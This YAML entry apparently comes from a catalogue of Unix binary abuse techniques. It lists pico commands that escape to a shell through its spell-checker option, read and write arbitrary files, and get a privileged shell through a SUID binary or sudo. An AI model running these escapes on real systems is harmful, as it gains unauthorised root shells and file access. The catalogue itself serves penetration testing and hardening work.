---
functions:
  shell:
    - code: |
        pico -s /bin/sh
        /bin/sh
        ^T
  file-write:
    - code: |
        pico file_to_write
        DATA
        ^O
  file-read:
    - code: pico file_to_read
  suid:
    - code: |
        TF=$(mktemp)
        echo '#!/bin/sh -p
        exec sh -p' > $TF
        chmod +x $TF
        ./pico -s $TF /etc/hosts
        ^T
  sudo:
    - code: |
        pico -s /bin/sh
        /bin/sh
        ^T
---
